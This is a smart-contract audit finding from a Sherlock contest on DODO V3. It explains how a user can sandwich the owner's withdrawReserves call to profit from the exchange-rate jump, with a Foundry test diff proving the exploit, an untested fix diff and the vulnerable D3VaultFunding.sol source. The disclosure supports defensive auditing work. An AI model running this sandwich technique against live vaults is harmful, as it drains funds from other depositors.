{
  "Title": "H-1: User can perform sandwich attack on withdrawReserves for profit",
  "Content": "# Issue H-1: User can perform sandwich attack on withdrawReserves for profit \n\nSource: https://github.com/sherlock-audit/2023-06-dodo-judging/issues/22 \n\n## Found by \ndirk\\_y, kutugu\n## Summary\nA malicious user could listen to the mempool for calls to `withdrawReserves`, at which point they can perform a sandwich attack by calling `userDeposit` before the withdraw reserves transaction and then `userWithdraw` after the withdraw reserves transaction. They can accomplish this using a tool like flashbots and make an instantaneous profit due to changes in exchange rates.\n\n## Vulnerability Detail\nWhen a user deposits or withdraws from the vault, the exchange rate of the token is calculated between the token itself and its dToken. As specified in an inline comment, the exchange rate is calculated like so:\n\n```solidity\n// exchangeRate = (cash + totalBorrows -reserves) / dTokenSupply\n```\n\nwhere `reserves = info.totalReserves - info.withdrawnReserves`. When the owner of the vault calls `withdrawReserves` the withdrawnReserves value increases, so the numerator of the above formula increases, and thus the exchange rate increases. An increase in exchange rate means that the same number of dTokens is now worth more of the underlying ERC20.\n\nBelow is a diff to the existing test suite that demonstrates the sandwich attack in action:\n\n```diff\ndiff --git a/new-dodo-v3/test/DODOV3MM/D3Vault/D3Vault.t.sol b/new-dodo-v3/test/DODOV3MM/D3Vault/D3Vault.t.sol\nindex a699162..337d1f5 100644\n--- a/new-dodo-v3/test/DODOV3MM/D3Vault/D3Vault.t.sol\n+++ b/new-dodo-v3/test/DODOV3MM/D3Vault/D3Vault.t.sol\n@@ -233,6 +233,47 @@ contract D3VaultTest is TestContext {\n         assertEq(d3Vault.getTotalDebtValue(address(d3MM)), 1300 ether);\n     }\n \n+    function testWithdrawReservesSandwichAttack() public {\n+        // Get dToken\n+        (address dToken2,,,,,,,,,,) = d3Vault.getAssetInfo(address(token2));\n+        \n+        // Approve tokens\n+        vm.prank(user1);\n+        token2.approve(address(dodoApprove), type(uint256).max);\n+        vm.prank(user2);\n+        token2.approve(address(dodoApprove), type(uint256).max);\n+        vm.prank(user2);\n+        D3Token(dToken2).approve(address(dodoApprove), type(uint256).max);\n+\n+        // Set user quotas and mint tokens\n+        mockUserQuota.setUserQuota(user1, address(token2), 1000 ether);\n+        mockUserQuota.setUserQuota(user2, address(token2), 1000 ether);\n+        token2.mint(user1, 1000 ether);\n+        token2.mint(user2, 1000 ether);\n+\n+        // User 1 deposits to allow pool to borrow\n+        vm.prank(user1);\n+        d3Proxy.userDeposit(user1, address(token2), 500 ether);\n+        token2.mint(address(d3MM), 100 ether);\n+        poolBorrow(address(d3MM), address(token2), 100 ether);\n+\n+        vm.warp(365 days + 1);\n+\n+        // Accrue interest from pool borrow\n+        d3Vault.accrueInterest(address(token2));\n+        uint256 reserves = d3Vault.getReservesInVault(address(token2));\n+\n+        // User 2 performs a sandwich attack on the withdrawReserves call to make a profit\n+        vm.prank(user2);\n+        d3Proxy.userDeposit(user2, address(token2), 100 ether);\n+        vm.prank(vaultOwner);\n+        d3Vault.withdrawReserves(address(token2), reserves);\n+        uint256 dTokenBalance = D3Token(dToken2).balanceOf(user2);\n+        vm.prank(user2);\n+        d3Proxy.userWithdraw(user2, address(token2), dToken2, dTokenBalance);\n+        assertGt(token2.balanceOf(user2), 1000 ether);\n+    }\n+\n     function testWithdrawReserves() public {\n         vm.prank(user1);\n         token2.approve(address(dodoApprove), type(uint256).max);\n\n```\n\n## Impact\nAn attacker can perform a sandwich attack on calls to `withdrawReserves` to make an instantaneous profit from the protocol. This effectively steals funds away from other legitimate users of the protocol.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-06-dodo/blob/main/new-dodo-v3/contracts/DODOV3MM/D3Vault/D3VaultFunding.sol#L235\n\n## Tool used\nManual Review\n\n## Recommendation\nThere are a couple of ways this type of attack could be prevented:\n\n1. User deposits could have a minimum lock time in the protocol to prevent an immediate withdraw. However the downside is the user will still profit in the same manner due to the fluctuation in exchange rates.\n2. Increasing reserves whilst accruing interest could have an equal and opposite decrease in token balance accounting. Every time reserves increase you are effectively taking token value out of the vault and \"reserving\" it for the protocol. Given the borrow rate is higher than the reserve increase rate, the exchange rate will continue to increase. I think something like the following would work (please note I haven't tested this):\n\n```diff\ndiff --git a/new-dodo-v3/contracts/DODOV3MM/D3Vault/D3VaultFunding.sol b/new-dodo-v3/contracts/DODOV3MM/D3Vault/D3VaultFunding.sol\nindex 2fb9364..9ad1702 100644\n--- a/new-dodo-v3/contracts/DODOV3MM/D3Vault/D3VaultFunding.sol\n+++ b/new-dodo-v3/contracts/DODOV3MM/D3Vault/D3VaultFunding.sol\n@@ -157,6 +157,7 @@ contract D3VaultFunding is D3VaultStorage {\n         uint256 compoundInterestRate = getCompoundInterestRate(borrowRatePerSecond, deltaTime);\n         totalBorrowsNew = borrowsPrior.mul(compoundInterestRate);\n         totalReservesNew = reservesPrior + (totalBorrowsNew - borrowsPrior).mul(info.reserveFactor);\n+        info.balance = info.balance - (totalReservesNew - reservesPrior);\n         borrowIndexNew = borrowIndexPrior.mul(compoundInterestRate);\n \n         accrualTime = currentTime;\n@@ -232,7 +233,7 @@ contract D3VaultFunding is D3VaultStorage {\n         uint256 cash = getCash(token);\n         uint256 dTokenSupply = IERC20(info.dToken).totalSupply();\n         if (dTokenSupply == 0) { return 1e18; }\n-        return (cash + info.totalBorrows - (info.totalReserves - info.withdrawnReserves)).div(dTokenSupply);\n+        return (cash + info.totalBorrows).div(dTokenSupply);\n     } \n \n     /// @notice Make sure accrueInterests or accrueInterest(token) is called before\n```\n\n\n\n\n## Discussion\n\n**hrishibhat**\n\n@traceurl \nIs this a valid issue?\n\n**traceurl**\n\n@hrishibhat This is a valid issue.\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/89",
  "Code": [
    {
      "filename": "new-dodo-v3/contracts/DODOV3MM/D3Vault/D3VaultFunding.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.16;\n\nimport {ICloneFactory} from \"../lib/CloneFactory.sol\";\nimport \"./D3VaultStorage.sol\";\nimport \"../../intf/ID3Oracle.sol\";\nimport \"../intf/ID3UserQuota.sol\";\nimport \"../intf/ID3PoolQuota.sol\";\nimport \"../intf/ID3MM.sol\";\nimport \"../intf/IDToken.sol\";\nimport \"../intf/ID3RateManager.sol\";\n\n/// @title D3VaultFunding\n/// @notice This contract defines the fund management of D3Vault.\n/// @notice Users (LP) deposit funds into vault to earn interests; D3Pools borrows funds from vault to make market.\n/// @notice Part of the borrow interests will become the reserve fund.\n/// @notice The borrow interest rate is dynamicly changing with fund utilization ratio, and is caculated by D3RateManager.\n/// @notice The fund utilization ratio is defined as U = borrows / (cash + borrows - reserves)\n/// @notice Users who deposit funds into vault will receive certain amounts of corresponding dToken. The amount is calculated by the exchange rate.\n/// @notice The exchange rate between dToken and underlying token is defined as exchangeRate = (cash + totalBorrows -reserves) / dTokenSupply\n/// @notice As time passes, totalBorrows will increase, so does the dToken exchangeRate. That's how users earn interests with dToken.\ncontract D3VaultFunding is D3VaultStorage {\n    using SafeERC20 for IERC20;\n    using DecimalMath for uint256;\n\n    // ---------- LP user Fund ----------\n\n    /// @notice user should transfer token to vault before call this function\n    function userDeposit(address user, address token) external nonReentrant allowedToken(token) {\n        accrueInterest(token);\n\n        AssetInfo storage info = assetInfo[token];\n        uint256 realBalance = IERC20(token).balanceOf(address(this));\n        uint256 amount = realBalance  - info.balance;\n        require(ID3UserQuota(_USER_QUOTA_).checkQuota(user, token, amount), Errors.EXCEED_QUOTA);\n        uint256 exchangeRate = _getExchangeRate(token);\n        uint256 totalDToken = IDToken(info.dToken).totalSupply();\n        require(totalDToken.mul(exchangeRate) + amount <= info.maxDepositAmount, Errors.EXCEED_MAX_DEPOSIT_AMOUNT);\n        uint256 dTokenAmount = amount.div(exchangeRate);\n\n        IDToken(info.dToken).mint(user, dTokenAmount);\n        info.balance = realBalance;\n\n        emit UserDeposit(user, token, amount);\n    }\n\n    /// @param to who receive tokens\n    /// @param user who pay dTokens\n    /// @param token original token address\n    /// @param dTokenAmount dtoken the token record amount\n    function userWithdraw(address to, address user, address token, uint256 dTokenAmount) external nonReentrant allowedToken(token) returns(uint256 amount) {\n        accrueInterest(token);\n        AssetInfo storage info = assetInfo[token];\n        require(dTokenAmount <= IDToken(info.dToken).balanceOf(msg.sender), Errors.DTOKEN_BALANCE_NOT_ENOUGH);\n\n        amount = dTokenAmount.mul(_getExchangeRate(token));\n        IDToken(info.dToken).burn(msg.sender, dTokenAmount);\n        IERC20(token).safeTransfer(to, amount);\n        info.balance = info.balance - amount;\n\n        // used for calculate user withdraw amount\n        // this function could be called from d3Proxy, so we need \"user\" param\n        // In the meantime, some users may hope to use this function directly,\n        // to prevent these users fill \"user\" param with wrong addresses,\n        // we use \"msg.sender\" param to check.\n        emit UserWithdraw(msg.sender, user, token, amount);\n    }\n\n    // ---------- Pool Fund ----------\n    function poolBorrow(address token, uint256 amount) external nonReentrant allowedToken(token) onlyPool {\n        uint256 quota = ID3PoolQuota(_POOL_QUOTA_).getPoolQuota(msg.sender, token);\n        accrueInterest(token);\n\n        AssetInfo storage info = assetInfo[token];\n        BorrowRecord storage record = info.borrowRecord[msg.sender];\n        uint256 oldInterestIndex = record.interestIndex;\n        uint256 currentInterestIndex = info.borrowIndex;\n        if (oldInterestIndex == 0) oldInterestIndex = 1e18;\n        uint256 usedQuota = record.amount.div(oldInterestIndex).mul(currentInterestIndex);\n        require(amount + usedQuota <= quota, Errors.EXCEED_QUOTA);\n        require(amount <= info.balance, Errors.AMOUNT_EXCEED_VAULT_BALANCE);\n\n        uint256 interests = usedQuota - record.amount;\n\n        record.amount = usedQuota + amount;\n        record.interestIndex = currentInterestIndex;\n        info.totalBorrows = info.totalBorrows + amount;\n        info.balance = info.balance - amount; \n        IERC20(token).safeTransfer(msg.sender, amount);\n\n        emit PoolBorrow(msg.sender, token, amount, interests);\n    }\n\n    function poolRepay(address token, uint256 amount) external nonReentrant allowedToken(token) onlyPool {\n        accrueInterest(token);\n\n        AssetInfo storage info = assetInfo[token];\n        BorrowRecord storage record = info.borrowRecord[msg.sender];\n        uint256 borrows = record.amount.div(record.interestIndex == 0 ? 1e18 : record.interestIndex).mul(info.borrowIndex);\n        require(amount <= borrows, Errors.AMOUNT_EXCEED);\n\n        uint256 interests = borrows - record.amount;\n\n        record.amount = borrows - amount;\n        record.interestIndex = info.borrowIndex;\n        info.totalBorrows = info.totalBorrows - amount;\n        info.balance = info.balance + amount;\n        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n\n        emit PoolRepay(msg.sender, token, amount, interests);\n    }\n\n    function poolRepayAll(address token) external nonReentrant allowedToken(token) onlyPool {\n        _poolRepayAll(msg.sender, token);\n    }\n\n    function _poolRepayAll(address pool, address token) internal {\n        accrueInterest(token);\n\n        AssetInfo storage info = assetInfo[token];\n        BorrowRecord storage record = info.borrowRecord[pool];\n        uint256 amount = record.amount.div(record.interestIndex == 0 ? 1e18 : record.interestIndex).mul(info.borrowIndex);\n\n        uint256 interests = amount;\n\n        record.amount = 0;\n        record.interestIndex = info.borrowIndex;\n        info.totalBorrows = info.totalBorrows - amount;\n        info.balance = info.balance - amount;\n        IERC20(token).safeTransferFrom(pool, address(this), amount);\n\n        emit PoolRepay(pool, token, amount, interests);\n    }\n\n    // ---------- Interest ----------\n\n    /// @notice Accrue interest for a token\n    /// @notice Step1: get time past\n    /// @notice Step2: get borrow rate\n    /// @notice Step3: calculate compound interest rate during the past time\n    /// @notice Step4: calculate increased borrows, reserves\n    /// @notice Step5: update borrows, reserves, accrual time, borrowIndex\n    /// @notice borrowIndex is the accrual interest rate\n    function _accrueInterestForRead(address token) internal view returns(uint256 totalBorrowsNew, uint256 totalReservesNew, uint256 borrowIndexNew, uint256 accrualTime) {\n        AssetInfo storage info = assetInfo[token];\n\n        uint256 currentTime = block.timestamp;\n        uint256 deltaTime = currentTime - info.accrualTime;\n        if (deltaTime == 0) return(info.totalBorrows, info.totalReserves, info.borrowIndex, currentTime);\n\n        uint256 borrowsPrior = info.totalBorrows;\n        uint256 reservesPrior = info.totalReserves;\n        uint256 borrowIndexPrior = info.borrowIndex;\n\n        uint256 borrowRate = ID3RateManager(_RATE_MANAGER_).getBorrowRate(token, getUtilizationRatio(token));\n        uint256 borrowRatePerSecond = borrowRate / SECONDS_PER_YEAR;\n        uint256 compoundInterestRate = getCompoundInterestRate(borrowRatePerSecond, deltaTime);\n        totalBorrowsNew = borrowsPrior.mul(compoundInterestRate);\n        totalReservesNew = reservesPrior + (totalBorrowsNew - borrowsPrior).mul(info.reserveFactor);\n        borrowIndexNew = borrowIndexPrior.mul(compoundInterestRate);\n\n        accrualTime = currentTime;\n    }\n\n    /// @notice Accrue interest for a token, change storage\n    function accrueInterest(address token) public {\n        (assetInfo[token].totalBorrows, assetInfo[token].totalReserves, assetInfo[token].borrowIndex, assetInfo[token].accrualTime) =\n        _accrueInterestForRead(token);\n    }\n\n    function accrueInterests() public {\n        for (uint256 i; i < tokenList.length; i++) {\n            address token = tokenList[i];\n            accrueInterest(token);\n        }\n    }\n\n    /// @dev r: interest rate per second (decimals 18)\n    /// @dev t: total time in seconds\n    /// @dev (1+r)^t = 1 + rt + t*(t-1)*r^2/2! + t*(t-1)*(t-2)*r^3/3! + ... + t*(t-1)...*(t-n+1)*r^n/n!\n    function getCompoundInterestRate(uint256 r, uint256 t) public pure returns (uint256) {\n        if (t < 1) {\n            return 1e18;\n        } else if (t < 2) {\n            return 1e18 + r * t;\n        } else {\n            return 1e18 + r * t + r.powFloor(2) * t * (t - 1) / 2;\n        }\n    }\n\n    // ----------- View ----------\n\n    function getPoolLeftQuota(address pool, address token) public view returns(uint256 leftQuota) {\n        uint256 quota = ID3PoolQuota(_POOL_QUOTA_).getPoolQuota(pool, token);\n        uint256 oldInterestIndex = assetInfo[token].borrowRecord[pool].interestIndex;\n        ( , ,uint256 currentInterestIndex, ) = _accrueInterestForRead(token);\n        if (oldInterestIndex == 0) oldInterestIndex = 1e18;\n        uint256 usedQuota = assetInfo[token].borrowRecord[pool].amount.div(oldInterestIndex).mul(currentInterestIndex);\n        leftQuota = quota > usedQuota ? quota - usedQuota : 0;\n    }\n\n    /// @notice U = borrows / (cash + borrows - reserves)\n    function getUtilizationRatio(address token) public view returns (uint256) {\n        uint256 borrows = getTotalBorrows(token);\n        uint256 cash = getCash(token);\n        uint256 reserves = getReservesInVault(token);\n        if (borrows == 0) return 0;\n        return borrows.div(cash + borrows - reserves);\n    }\n\n    function getBorrowRate(address token) public view returns (uint256 rate) {\n        rate = ID3RateManager(_RATE_MANAGER_).getBorrowRate(token, getUtilizationRatio(token));\n    }\n\n    function getCash(address token) public view returns (uint256) {\n        return assetInfo[token].balance;\n    }\n\n    function getTotalBorrows(address token) public view returns (uint256) {\n        return assetInfo[token].totalBorrows;\n    }\n\n    function getReservesInVault(address token) public view returns (uint256) {\n        AssetInfo storage info = assetInfo[token];\n        return info.totalReserves - info.withdrawnReserves;\n    }\n\n    /// @notice exchangeRate = (cash + totalBorrows -reserves) / dTokenSupply\n    /// @notice Make sure accrueInterests or accrueInterest(token) is called before\n    function _getExchangeRate(address token) internal view returns (uint256) {\n        AssetInfo storage info = assetInfo[token];\n        uint256 cash = getCash(token);\n        uint256 dTokenSupply = IERC20(info.dToken).totalSupply();\n        if (dTokenSupply == 0) { return 1e18; }\n        return (cash + info.totalBorrows - (info.totalReserves - info.withdrawnReserves)).div(dTokenSupply);\n    } \n\n    /// @notice Make sure accrueInterests or accrueInterest(token) is called before\n    function _getBalanceAndBorrows(address pool, address token) internal view returns (uint256, uint256) {\n        AssetInfo storage info = assetInfo[token];\n        BorrowRecord storage record = info.borrowRecord[pool];\n\n        uint256 balance = ID3MM(pool).getTokenReserve(token);\n        uint256 borrows = record.amount.div(record.interestIndex == 0 ? 1e18 : record.interestIndex).mul(info.borrowIndex);\n\n        return (balance, borrows);\n    }\n\n    /// @notice Make sure accrueInterests() is called before calling this function\n    function _getTotalDebtValue(address pool) internal view returns (uint256 totalDebt) {\n        for (uint256 i = 0; i < tokenList.length; i++) {\n            address token = tokenList[i];\n            AssetInfo storage info = assetInfo[token];\n            BorrowRecord memory record = info.borrowRecord[pool];\n            uint256 borrows = record.amount.div(record.interestIndex == 0 ? 1e18 : record.interestIndex).mul(info.borrowIndex);\n            uint256 price = ID3Oracle(_ORACLE_).getPrice(token);\n            totalDebt += borrows.mul(price);\n        }\n    }\n\n    function getTotalAssetsValue(address pool) public view returns (uint256 totalValue) {\n        for (uint256 i = 0; i < tokenList.length; i++) {\n            address token = tokenList[i];\n            uint256 price = ID3Oracle(_ORACLE_).getPrice(token);\n            totalValue += DecimalMath.mul(ID3MM(pool).getTokenReserve(token), price);\n        }\n    }\n\n    /// @notice Make sure accrueInterests() is called before\n    /// @notice net = balance - borrowed\n    /// @notice collateral = sum(min(positive net, maxCollateralAmount）* weight * price)\n    /// @notice debt = sum(negative net * weight * price)\n    /// @notice collateralRatio = collateral / debt\n    function _getCollateralRatio(address pool) internal view returns (uint256) {\n        uint256 collateral = 0;\n        uint256 debt = 0;\n        for (uint256 i; i < tokenList.length; i++) {\n            address token = tokenList[i];\n            AssetInfo storage info = assetInfo[token];\n\n            (uint256 balance, uint256 borrows) = _getBalanceAndBorrows(pool, token);\n            uint256 price = ID3Oracle(_ORACLE_).getPrice(token);\n            if (balance >= borrows) {\n                collateral += min(balance - borrows, info.maxCollateralAmount).mul(info.collateralWeight).mul(price);\n            } else {\n                debt += (borrows - balance).mul(info.debtWeight).mul(price);\n            }\n        }\n        return _ratioDiv(collateral, debt);\n    }\n\n    function checkSafe(address pool) public view returns (bool) {\n        return getCollateralRatio(pool) >  1e18 + IM;\n    }\n\n    function checkBorrowSafe(address pool) public view returns (bool) {\n        return getCollateralRatioBorrow(pool) > IM;\n    }\n\n    function checkCanBeLiquidated(address pool) public view returns (bool) {\n        return getCollateralRatio(pool) < 1e18 + MM;\n    }\n\n    function checkCanBeLiquidatedAfterAccrue(address pool) public view returns (bool) {\n        return _getCollateralRatio(pool) < 1e18 + MM;\n    }\n\n    function checkBadDebt(address pool) public view returns (bool) {\n        return getCollateralRatio(pool) < 1e18;\n    }\n\n    function checkBadDebtAfterAccrue(address pool) public view returns (bool) {\n        return _getCollateralRatio(pool) < 1e18;\n    }\n\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a <= b ? a : b;\n    }\n\n    function _ratioDiv(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0 && b == 0) {\n            return 1e18;\n        } else if (a == 0 && b != 0) {\n            return 0;\n        } else if (a != 0 && b == 0) {\n            return type(uint256).max;\n        } else {\n            return a.div(b);\n        }\n    }\n\n    // ======================= Read Only =======================\n\n    function getExchangeRate(address token) public view returns(uint256 exchangeRate) {\n        (uint256 totalBorrows, uint256 totalReserves, ,) = _accrueInterestForRead(token);\n        uint256 cash = getCash(token);\n        uint256 dTokenSupply = IERC20(assetInfo[token].dToken).totalSupply();\n        if (dTokenSupply == 0) { return 1e18; }\n        exchangeRate = (cash + totalBorrows - (totalReserves - assetInfo[token].withdrawnReserves)).div(dTokenSupply);\n    }\n\n    function getLatestBorrowIndex(address token) public view returns (uint256 borrowIndex) {\n        AssetInfo storage info = assetInfo[token];\n        uint256 deltaTime = block.timestamp - info.accrualTime;\n        uint256 borrowRate = getBorrowRate(token);\n        uint256 borrowRatePerSecond = borrowRate / SECONDS_PER_YEAR;\n        uint256 compoundInterestRate = getCompoundInterestRate(borrowRatePerSecond, deltaTime);\n        borrowIndex = info.borrowIndex.mul(compoundInterestRate);\n    }\n\n    function getPoolBorrowAmount(address pool, address token) public view returns (uint256 amount) {\n        BorrowRecord storage record = assetInfo[token].borrowRecord[pool];\n        uint256 borrowIndex = getLatestBorrowIndex(token);\n        amount = record.amount.div(record.interestIndex == 0 ? 1e18 : record.interestIndex).mul(borrowIndex);\n    }\n\n    function getTotalDebtValue(address pool) external view returns (uint256 totalDebt) {\n        for (uint256 i = 0; i < tokenList.length; i++) {\n            address token = tokenList[i];\n            uint256 borrowAmount = getPoolBorrowAmount(pool, token);\n            uint256 price = ID3Oracle(_ORACLE_).getPrice(token);\n            totalDebt += borrowAmount.mul(price);\n        }\n    }\n\n    function getBalanceAndBorrows(address pool, address token) public view returns (uint256, uint256) {\n        uint256 balance = ID3MM(pool).getTokenReserve(token);\n        uint256 borrows = getPoolBorrowAmount(pool, token);\n        return (balance, borrows);\n    }\n\n    function getCollateralRatio(address pool) public view returns (uint256) {\n        uint256 collateral = 0;\n        uint256 debt = 0;\n        for (uint256 i; i < tokenList.length; i++) {\n            address token = tokenList[i];\n            AssetInfo storage info = assetInfo[token];\n\n            (uint256 balance, uint256 borrows) = getBalanceAndBorrows(pool, token);\n            uint256 price = ID3Oracle(_ORACLE_).getPrice(token);\n            \n            if (balance >= borrows) {\n                collateral += min(balance - borrows, info.maxCollateralAmount).mul(info.collateralWeight).mul(price);\n            } else {\n                debt += (borrows - balance).mul(info.debtWeight).mul(price);\n            }\n        }\n        return _ratioDiv(collateral, debt);\n    }\n    \n    /// @notice collateralRatioBorrow = ∑[min(maxCollateralAmount，balance - borrows）] / ∑borrows\n    function getCollateralRatioBorrow(address pool) public view returns (uint256) {\n        uint256 balanceSumPositive = 0;\n        uint256 balanceSumNegative = 0;\n        uint256 borrowedSum = 0;\n        for (uint256 i; i < tokenList.length; i++) {\n            address token = tokenList[i];\n\n            (uint256 balance, uint256 borrows) = getBalanceAndBorrows(pool, token);\n            uint256 price = ID3Oracle(_ORACLE_).getPrice(token);\n\n            if (balance >= borrows) {\n                balanceSumPositive += min(balance - borrows, assetInfo[token].maxCollateralAmount).mul(price);\n            } else {\n                balanceSumNegative += (borrows - balance).mul(price);\n            }\n\n            borrowedSum += borrows.mul(price);\n        }\n        \n        uint256 balanceSum = balanceSumPositive < balanceSumNegative ? 0 : balanceSumPositive - balanceSumNegative;\n        return _ratioDiv(balanceSum, borrowedSum);\n    }\n\n    function getCumulativeBorrowRate(address pool, address token) external view returns (uint256 cumulativeRate, uint256 currentAmount) {\n        BorrowRecord storage record = assetInfo[token].borrowRecord[pool];\n        uint256 borrowIndex = getLatestBorrowIndex(token);\n        cumulativeRate = borrowIndex.div(record.interestIndex == 0 ? 1e18 : record.interestIndex);\n        currentAmount = record.amount;\n    }\n}"
    }
  ]
}